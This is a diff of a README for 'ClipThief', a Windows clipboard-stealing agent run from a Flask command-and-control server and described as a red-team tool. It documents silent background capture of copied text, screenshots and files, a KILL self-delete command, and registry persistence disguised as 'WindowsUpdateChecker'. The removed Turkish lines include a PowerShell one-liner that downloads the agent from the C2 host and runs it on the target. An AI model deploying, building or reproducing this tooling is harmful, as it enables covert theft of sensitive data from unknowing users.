@@ -14,130 +14,125 @@
 
 # ClipThief
 
-Windows clipboard izleme aracı. Red team tatbikatları ve güvenlik araştırmaları için geliştirilmiştir.
+Windows clipboard monitoring tool. Developed for red team exercises and security research.
 
-**Yazar:** @erberkan / B3R-SEC
-
----
-
-## Bileşenler
-
-| Bileşen | Teknoloji | Açıklama |
-|---------|-----------|----------|
-| **Agent** | C++ / Win32 API | Hedef sistemde arka planda sessizce çalışır, clipboard'ı izler |
-| **C2 Sunucusu** | Python 3 + Flask + Rich | Operatör terminal arayüzü, SQLite, heartbeat, otomatik derleme, loglama |
+**Author:** @erberkan / B3R-SEC
 
 ---
 
-## Gereksinimler
+## Components
 
-### C2 Sunucusu
-- Python 3.8 veya üstü
+| Component | Technology | Description |
+|-----------|------------|-------------|
+| **Agent** | C++ / Win32 API | Runs silently in the background on the target system, monitors clipboard |
+| **C2 Server** | Python 3 + Flask + Rich | Operator terminal interface, SQLite database, heartbeat monitoring |
+
+---
+
+## Requirements
+
+### C2 Server
+- Python 3.8 or higher
 - pip
 
-### Agent (Otomatik Derleme için)
+### Agent (for compilation)
 - Windows 10/11
-- Visual Studio 2022 (Community veya üstü) — C++ Desktop workload
+- Visual Studio 2022 (Community or higher)
 - Windows 10 SDK
-
-> Agent'ı manuel derlemek **gerekmez**. C2 başlatıldığında `bingo.exe` otomatik derlenir ve HTTP üzerinden servis edilir.
 
 ---
 
-## Kurulum
+## Setup
 
-### C2 Sunucusu
+### 1. C2 Server
 
 ```bash
 cd C2
 pip install -r requirements.txt
 ```
 
-`requirements.txt`:
+`requirements.txt` contents:
 ```
 flask>=3.0.0
 rich>=13.0.0
 ```
 
+### 2. Agent — Pre-Build Configuration
+
+Open `ClipboardDump/ClipboardDump/ClipboardDump.cpp` and update the C2 address:
+
+```cpp
+// Around line 37
+static const char* C2_HOST = "127.0.0.1";  // ← Your C2 server's IP
+static const int   C2_PORT = 5000;          // ← C2 port
+```
+
+Optional settings:
+
+```cpp
+static const int   POLL_MS   = 3000;                   // Command polling interval (ms)
+static const char* TASK_NAME = "WindowsUpdateChecker"; // Persistence key name
+static const size_t MAX_FILE = 50 * 1024 * 1024;       // Max file size (50 MB)
+```
+
+### 3. Agent — Build
+
+1. Open `ClipboardDump/ClipboardDump.sln` with Visual Studio 2022
+2. Select **Release | x64** configuration
+3. `Build → Build Solution` (or `Ctrl+Shift+B`)
+4. Compiled EXE: `ClipboardDump/x64/Release/ClipboardDump.exe`
+
 ---
 
-## Kullanım
+## Usage
 
-### C2 Sunucusunu Başlatma
+### Starting the C2 Server
 
 ```bash
 cd C2
 
-# Varsayılan — listen 0.0.0.0:5000, agent IP otomatik tespit edilir
+# Default (0.0.0.0:5000)
 python c2_server.py
 
-# Agent IP açıkça belirtilerek
-python c2_server.py --agent-ip 192.168.1.100
+# Custom address and port
+python c2_server.py --host 192.168.1.100 --port 8080
 
-# Tüm parametreler
-python c2_server.py --host 0.0.0.0 --port 8080 --agent-ip 192.168.1.100
-
-# Windows batch ile (bağımlılıkları otomatik yükler)
+# Windows batch (auto-installs dependencies)
 setup_and_run.bat
 ```
 
-**Argümanlar:**
-
-| Argüman | Varsayılan | Açıklama |
-|---------|-----------|----------|
-| `--host` | `0.0.0.0` | Flask'ın dinlediği adres |
-| `--port` | `5000` | Flask portu |
-| `--agent-ip` | otomatik | Agent'ların bağlandığı IP — `bingo.exe`'ye gömülür |
-
-`--agent-ip` verilmezse: `--host` `0.0.0.0` değilse onu kullanır, aksi hâlde makinenin primary IP'sini otomatik tespit eder.
-
-### Startup Çıktısı
-
+Successful startup output:
 ```
 [*] Database: C:\...\C2\c2_data.db  (0 agents loaded)
-[*] Log: C:\...\C2\logs\
-[*] Listening on  0.0.0.0:5000
-[*] Agent target  192.168.1.100:5000
-[*] Building bingo.exe ...
-[+] Agent ready:  C:\...\C2\agents\bingo.exe
-
-╭──  PowerShell One-Liner  ──────────────────────────────────────────────────────╮
-│  $p="$env:TEMP\bingo.exe";(New-Object Net.WebClient).DownloadFile(            │
-│  'http://192.168.1.100:5000/agent/bingo.exe',$p);Start-Process $p             │
-╰────────────────────────────────────────────────────────────────────────────────╯
-
-  Press Enter to start C2...
+[*] Listening on 0.0.0.0:5000
 ```
 
-PowerShell one-liner'ı kopyaladıktan sonra Enter'a basarak C2 terminal arayüzünü başlatın.
+### Running the Agent
 
-### Agent'ı Hedef Sistemde Çalıştırma
+Execute the compiled `ClipboardDump.exe` on the target system.
 
-Hedef sistemde PowerShell one-liner'ı çalıştırın:
-
-```powershell
-$p="$env:TEMP\bingo.exe";(New-Object Net.WebClient).DownloadFile('http://192.168.1.100:5000/agent/bingo.exe',$p);Start-Process $p
-```
-
-- `bingo.exe` C2'den indirilir ve `%TEMP%\bingo.exe` olarak kaydedilir
-- Konsol penceresi açılmaz (Windows subsystem / WinMain)
-- Task Manager'da `bingo.exe` olarak görünür
-- C2 erişilebilir değilse sessizce beklemeye devam eder
-- Her 3 saniyede bir C2'ye komut sorgusu gönderir (aynı zamanda heartbeat)
+- No console window appears (Windows subsystem / WinMain)
+- Visible in Task Manager as `ClipboardDump.exe`
+- Silently waits if C2 is unreachable
+- Sends a command query to C2 every 3 seconds (also serves as heartbeat)
 
 ---
 
-## C2 Arayüzü
+## C2 Interface
 
-### Ana Ekran
+### Main Screen
 
 ```
-╭────┬────────────┬──────────┬──────────────────┬─────────────────┬─────────────────────┬──────────╮
-│  # │ ID         │ USER     │ HOSTNAME         │ IP              │ LAST SEEN           │ STATUS   │
-├────┼────────────┼──────────┼──────────────────┼─────────────────┼─────────────────────┼──────────┤
-│  1 │ a1b2c3d4...│ erberkan │ DESKTOP-ABC123   │ 192.168.1.50   │ 2026-04-22 14:35:00 │ ● active │
-│  2 │ f7e6d5c4...│ john     │ LAPTOP-XYZ       │ 10.0.0.12      │ 2026-04-22 13:10:00 │ ✗ dead   │
-╰────┴────────────┴──────────┴──────────────────┴─────────────────┴─────────────────────┴──────────╯
+╭──────────────────────────────────────────────────────────────────────╮
+│                                                                      │
+│    ClipThief C2  ·  @erberkan / B3R-SEC                              │
+│                                                                      │
+╰──────────────────────────────────────────────────────────────────────╯
+
+  #    ID           USER             HOSTNAME             IP               LAST SEEN            STATUS
+  ───────────────────────────────────────────────────────────────────────────────────────────────────────
+  1    a1b2c3d4...  erberkan         DESKTOP-ABC123       192.168.1.50     2026-04-21 14:35:00  ● active
+  2    f7e6d5c4...  john             LAPTOP-XYZ           10.0.0.12        2026-04-21 13:10:00  ✗ dead
 
   [N]  Select agent by number
   [D]  Database management
@@ -145,12 +140,12 @@ $p="$env:TEMP\bingo.exe";(New-Object Net.WebClient).DownloadFile('http://192.168
   [Q]  Quit
 ```
 
-- `● active` — Agent son 10 saniye içinde polling yapmış
-- `✗ dead` — 10+ saniyedir polling yok veya kill komutu gönderilmiş
+- `● active` — Agent polled within the last 10 seconds, alive
+- `✗ dead` — More than 10 seconds since last poll, or kill command was sent
 
-### Yeni Agent Bağlandığında
+### When a New Agent Connects
 
-Agent ilk kez bağlandığında terminal'e otomatik bildirim paneli gelir ve agent menüsü açılır:
+When an agent connects for the first time, an automatic notification panel appears in the terminal and the agent menu opens:
 
 ```
 ╭────────────────────────────────────────────────────────╮
@@ -162,101 +157,100 @@ Agent ilk kez bağlandığında terminal'e otomatik bildirim paneli gelir ve age
 │  Hostname: DESKTOP-ABC123                              │
 │  IP      : 192.168.1.50                                │
 │  OS      : Windows 10.0 Build 19045                    │
-│  Time    : 2026-04-22 14:32:11                         │
+│  Time    : 2026-04-21 14:32:11                         │
 │                                                        │
 ╰────────────────────────────────────────────────────────╯
   Press Enter to open agent menu...
 ```
 
-### Agent Menüsü
+### Agent Menu
 
 ```
-╭─ Agent Details ──────────────────────────────╮
-│ Agent ID:   a1b2c3d4-e5f6-...               │
-│ User:       erberkan                         │
-│ Hostname:   DESKTOP-ABC123                   │
-│ IP:         192.168.1.50                     │
-│ OS:         Windows 10.0 Build 19045         │
-│ First seen: 2026-04-22 14:32:11              │
-│ Last seen:  2026-04-22 14:35:00              │
-│ Status:     ● active                         │
-│ Clipboard:  14 entries                       │
-╰──────────────────────────────────────────────╯
+╭── Agent: a1b2c3d4... ──────────────────────────────────────╮
+│  User    : erberkan                                         │
+│  Hostname: DESKTOP-ABC123                                   │
+│  IP      : 192.168.1.50                                     │
+│  OS      : Windows 10.0 Build 19045                         │
+│  Status  : ● active                                         │
+│  Clips   : 14                                               │
+╰─────────────────────────────────────────────────────────────╯
 
   [1] View clipboard history
-  [2] Send KILL command  (self-destruct + delete)
-  [3] Send PERSIST command  (add scheduled task)
+  [2] Send KILL command
+  [3] Send PERSIST command
   [4] Delete this agent from DB
   [0] Back
 ```
 
-### Clipboard Geçmişi
+### Clipboard History
 
 ```
   #     TYPE    TIMESTAMP              PREVIEW / FILENAME
   ─────────────────────────────────────────────────────────────────────
-  1     [TXT]   2026-04-22 14:32:15    SELECT * FROM users WHERE...
-  2     [IMG]   2026-04-22 14:35:01    clipboard.bmp
-  3     [FILE]  2026-04-22 14:38:44    salary_report.xlsx
+  1     [TXT]   2026-04-21 14:32:15    SELECT * FROM users WHERE...
+  2     [IMG]   2026-04-21 14:35:01    clipboard.bmp
+  3     [FILE]  2026-04-21 14:38:44    salary_report.xlsx
 ```
 
-Sütun renkleri: `[TXT]` → cyan, `[IMG]` → sarı, `[FILE]` → yeşil
+Column colors: `[TXT]` → cyan, `[IMG]` → yellow, `[FILE]` → green
 
-Komutlar:
-- `1` — #1 kaydı görüntüle (metin syntax-highlight ile inline, resim/dosya otomatik açılır)
-- `D 2` — #2 kaydı `downloads/` klasörüne indir
-- `0` — Geri
+Commands:
+- `1` — View entry #1 (text shown inline with syntax highlight, images/files open automatically)
+- `D 2` — Download entry #2 to `downloads/` folder
+- `0` — Back
 
-### Metin Görüntüleme (Syntax Highlight)
+### Text View (Syntax Highlight)
 
-| İçerik | Dil | Tema |
-|--------|-----|------|
-| `{` veya `[` ile başlıyorsa | JSON | monokai |
-| `SELECT`, `INSERT`, `UPDATE`, `DELETE`, `CREATE` içeriyorsa | SQL | monokai |
-| `def `, `import `, `class ` içeriyorsa | Python | monokai |
-| `<?xml`, `<html` ile başlıyorsa | XML | monokai |
-| Diğer | Düz metin | Panel içinde |
+Text content is automatically colorized with language detection:
 
-### Desteklenen Clipboard Tipleri
+| Content | Language | Theme |
+|---------|----------|-------|
+| Starts with `{` or `[` | JSON | monokai |
+| Contains `SELECT`, `INSERT`, `UPDATE`, `DELETE`, `CREATE` | SQL | monokai |
+| Contains `def `, `import `, `class ` | Python | monokai |
+| Starts with `<?xml`, `<html`, `<root` | XML | monokai |
+| Other | Plain text | In Panel |
 
-| Tip | Windows Formatı | C2'de Görünüm |
-|-----|----------------|---------------|
-| Metin | `CF_UNICODETEXT` | Terminal'de syntax-highlighted inline |
-| Resim (screenshot vb.) | `CF_DIB` | BMP olarak kaydedilip otomatik açılır |
-| Kopyalanan dosya | `CF_HDROP` | Orijinal uzantıyla indirilir |
+### Supported Clipboard Types
+
+| Type | Windows Format | C2 Display |
+|------|---------------|------------|
+| Text | `CF_UNICODETEXT` | Syntax-highlighted inline in terminal |
+| Image (screenshot etc.) | `CF_DIB` | Saved as BMP and opened automatically |
+| Copied file | `CF_HDROP` | Downloaded with original extension |
 
 ---
 
-## Komutlar
+## Commands
 
 ### KILL — Self-Destruct
 
-Agent menüsünden `[2]` seçin:
+Select `[2]` from the agent menu. Confirm with:
 
 ```
-Send KILL command? This will destroy the agent [y/n]:
+Kill this agent? [y/n]:
 ```
 
-`y` ile onaylayın. Agent bir sonraki polling'de (max 3 saniye) komutu alır ve:
+Confirm with `y`. The agent receives the command on the next poll (max 3 seconds) and:
 
-1. Registry'deki `AgentID` değerini siler
-2. Persistence Run key'ini siler (varsa)
-3. Kendini silecek bir batch dosyası oluşturur (`%TEMP%`)
-4. Process'i sonlandırır
+1. Deletes the `AgentID` value from the registry
+2. Removes the persistence Run key if it was set
+3. Creates a batch file to delete itself (`%TEMP%`)
+4. Terminates the process
 
-> **Not:** EXE silme işlemi `ShellExecuteA` ile tetiklenir; bazı Windows 10/11 ortamlarında başarısız olabilir. C2 agent'ı `✗ dead` olarak işaretler; disk üzerinde kalabilir.
+> **Note:** EXE deletion is triggered via `ShellExecuteA`; the `.bat` file may not run on some Windows 10/11 environments. In that case the EXE is marked `✗ dead` by C2 but may remain on disk.
 
-### PERSIST — HKCU Run Key
+### PERSIST — Registry Run Key
 
-Agent menüsünden `[3]` ile gönderin.
+Send via `[3]` from the agent menu.
 
-Agent kendini HKCU Run registry key'ine ekler — **yönetici yetkisi gerekmez:**
+The agent adds itself to the HKCU Run registry key — **no administrator privileges required**:
 
-- **Registry yolu:** `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
-- **Değer adı:** `WindowsUpdateChecker`
-- **Tetikleyici:** Her kullanıcı girişinde otomatik
+- **Registry key:** `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
+- **Value name:** `WindowsUpdateChecker` (configurable in source)
+- **Trigger:** On every user login
 
-Elle kaldırmak için:
+To remove manually:
 ```cmd
 reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v WindowsUpdateChecker /f
 ```
@@ -265,133 +259,95 @@ reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v WindowsUpdate
 
 ## Heartbeat & Status
 
-C2 her 5 saniyede tüm agent'ların `last_seen` zamanını kontrol eder:
+The C2 server checks `last_seen` for all agents every 5 seconds:
 
-- Son 10 saniye içinde polling → `● active`
-- 10+ saniye sessiz → `✗ dead`
+- Agent polled within the last 10 seconds → `● active`
+- Silent for more than 10 seconds → `✗ dead`
 
-Ayrı bir heartbeat endpoint'i yoktur; agent'ın her 3 saniyede gönderdiği komut sorgusu `last_seen`'i otomatik günceller.
-
----
-
-## Loglama
-
-Her C2 başlatmasında `C2/logs/` altında yeni bir log dosyası oluşur:
-
-```
-C2/logs/
-└── 2026-04-22_14-30-00.log
-└── 2026-04-22_18-05-12.log
-```
-
-**Log formatı:**
-```
-2026-04-22 14:30:00  INFO      SERVER START    listen=0.0.0.0:5000  agent_ip=192.168.1.100
-2026-04-22 14:30:08  INFO      BUILD OK        output=agents\bingo.exe  size=98,304 bytes
-2026-04-22 14:32:11  INFO      AGENT NEW       id=a1b2c3...  user=john  hostname=PC-01
-2026-04-22 14:32:15  INFO      CLIPBOARD       id=a1b2c3...  type=text  seq=1
-2026-04-22 14:35:00  INFO      AGENT DOWNLOAD  bingo.exe served  src=10.0.0.10
-2026-04-22 14:40:00  INFO      COMMAND QUEUED  id=a1b2c3...  command=kill  by=operator
-2026-04-22 14:40:15  WARNING   AGENT DEAD      id=a1b2c3...  elapsed=12s
-2026-04-22 16:00:00  INFO      SERVER STOP     operator quit
-```
-
-**Loglanan olaylar:** Server start/stop, agent build, agent bağlantıları, clipboard kayıtları, komut gönderimi, agent download, heartbeat ölümleri, DB temizleme.
+There is no separate heartbeat endpoint; the command query the agent sends every 3 seconds (`GET /api/agent/<id>/command`) automatically updates `last_seen`.
 
 ---
 
-## Veritabanı Yönetimi
+## Database Management
 
-Ana menüden `[D]`:
+Access the database management screen from the main menu with `[D]`:
 
 ```
-╭─ Database ───────────────────────────╮
-│ Path:      C:\...\C2\c2_data.db     │
-│ Size:      2,048,576 bytes           │
-│ Agents:    3                         │
-│ Clipboard: 892 entries               │
-╰──────────────────────────────────────╯
+╭── Database ──────────────────────────────────────────────────╮
+│  Path     : C:\...\C2\c2_data.db                             │
+│  Size     : 2,048,576 bytes                                   │
+│  Agents   : 3                                                 │
+│  Clipboard: 892 entries                                       │
+╰──────────────────────────────────────────────────────────────╯
 
   [1] Clear ALL data  (agents + clipboard)
   [0] Back
 ```
 
-- **Tüm veriyi sil:** `[1]` → `y/n` onay
-- **Tek agent sil:** Agent menüsü → `[4]` → `y/n` onay
+- **Delete all data:** `[1]` → confirmation prompt
+- **Delete single agent:** Agent Menu → `[4]` → confirmation prompt
 
-C2 yeniden başlatıldığında veritabanı otomatik yüklenir; tüm geçmiş korunur.
+When the C2 is restarted, the database is automatically loaded; all history is preserved.
 
 ---
 
-## Dosya Yapısı
+## File Structure
 
 ```
 ClipThief/
 ├── ClipboardDump/
 │   ├── ClipboardDump.sln
 │   └── ClipboardDump/
-│       ├── ClipboardDump.cpp       # Agent kaynak kodu (C2 tarafından otomatik derlenir)
+│       ├── ClipboardDump.cpp       # Agent source code (~615 lines)
 │       └── ClipboardDump.vcxproj
 │
 ├── C2/
-│   ├── c2_server.py                # C2 sunucusu (Flask + Rich + SQLite)
+│   ├── c2_server.py                # C2 server (Flask + Rich + SQLite)
 │   ├── requirements.txt
-│   ├── setup_and_run.bat           # Windows başlatma scripti
-│   ├── c2_data.db                  # Veritabanı (otomatik oluşur)
-│   ├── agents/                     # Derlenmiş agent'lar
-│   │   └── bingo.exe               # Startup'ta otomatik derlenir
-│   ├── downloads/                  # İndirilen clipboard dosyaları
-│   └── logs/                       # Oturum logları
-│       └── YYYY-MM-DD_HH-MM-SS.log
+│   ├── setup_and_run.bat           # Windows startup script
+│   ├── c2_data.db                  # Database (auto-created)
+│   └── downloads/                  # Downloaded files
 │
-├── PROJECT.md                      # Teknik dokümantasyon
-└── README.md                       # Bu dosya
+├── PROJECT.md                      # Technical documentation (Turkish)
+├── PROJECT_EN.md                   # Technical documentation (English)
+├── README.md                       # This file (Turkish)
+└── README_EN.md                    # This file (English)
 ```
 
 ---
 
-## Sık Karşılaşılan Sorunlar
+## Troubleshooting
 
-### bingo.exe derlenmiyor
-- Visual Studio 2022 kurulu mu kontrol edin (C++ Desktop workload dahil)
-- Windows 10 SDK kurulu mu kontrol edin (`Tools → Get Tools and Features`)
-- `C2/logs/` altındaki log dosyasında `BUILD FAILED` satırını inceleyin
+### Agent cannot connect to C2
+- Check that `C2_HOST` and `C2_PORT` are correct
+- Verify the C2 server is running
+- Check that Windows Firewall allows the target port
 
-### Agent C2'ye bağlanamıyor
-- `--agent-ip` ile doğru IP verildi mi kontrol edin
-- C2 sunucusu çalışıyor mu kontrol edin
-- Windows Firewall hedef port için açık mı kontrol edin
+### Build error: `identifier not found`
+- Verify **Release | x64** configuration is selected in Visual Studio
+- Check that Windows 10 SDK is installed (`Tools → Get Tools and Features`)
+- If you get a `CoCreateGuid` error: `rpcrt4.lib` linker dependency must be present (project is already configured)
 
-### Clipboard değişimi C2'ye gelmiyor
-- Agent'ın `bingo.exe` olarak Task Manager'da çalıştığını doğrulayın
-- Log dosyasında `CLIPBOARD` satırları var mı kontrol edin
+### Clipboard changes not reaching C2
+- Verify the agent is running as `ClipboardDump.exe` in Task Manager
+- Check that the agent ID's `last_seen` is being updated in C2 logs
 
-### Agent status dead görünüyor ama çalışıyor
-- Ağ gecikmesi `AGENT_TIMEOUT_SEC` eşiğini aşıyor olabilir
-- `c2_server.py` içindeki `AGENT_TIMEOUT_SEC` değerini artırın (varsayılan: 10)
+### Agent status shows dead but it's running
+- There may be network latency between the C2 server and agent; the 10-second timeout may be too short
+- You can increase `AGENT_TIMEOUT_SEC` in `c2_server.py` (default: 10)
 
-### İndirilen resim açılmıyor
-- `downloads/` klasöründeki `.bmp` dosyası Windows Resim Görüntüleyici ile açılabilir
-- Büyük ekran görüntülerinde BMP boyutu yüksek olabilir (sıkıştırmasız format)
+### Downloaded image won't open
+- The `.bmp` file in `downloads/` can be opened with Windows Photo Viewer
+- Large screenshots may produce large BMP files (uncompressed format)
+
+### Rich dependency not installed
+```bash
+pip install rich>=13.0.0
+```
+Rich is not optional — it is a required dependency for the C2.
 
 ---
 
-## Temizlik
+## Technical Details
 
-```
-Agent tarafı:
-  kill komutu       → registry + Run key + EXE silinir (C2 menüsünden)
-  Persistence       → reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v WindowsUpdateChecker /f
-
-C2 tarafı:
-  Tek agent sil     → Agent Menüsü → [4]
-  Tam DB temizlik   → Ana Menü → [D] → [1] → y
-  Log dosyaları     → C2/logs/ dizini manuel silin
-  Agent EXE         → C2/agents/bingo.exe manuel silin
-```
-
----
-
-## Teknik Detaylar
-
-Mimarinin tam açıklaması, tüm fonksiyonların belgelenmesi ve veri akışı diyagramları için `PROJECT.md` dosyasına bakın.
+For a complete description of the architecture, documentation of all functions, and data flow diagrams, see `PROJECT.md`.
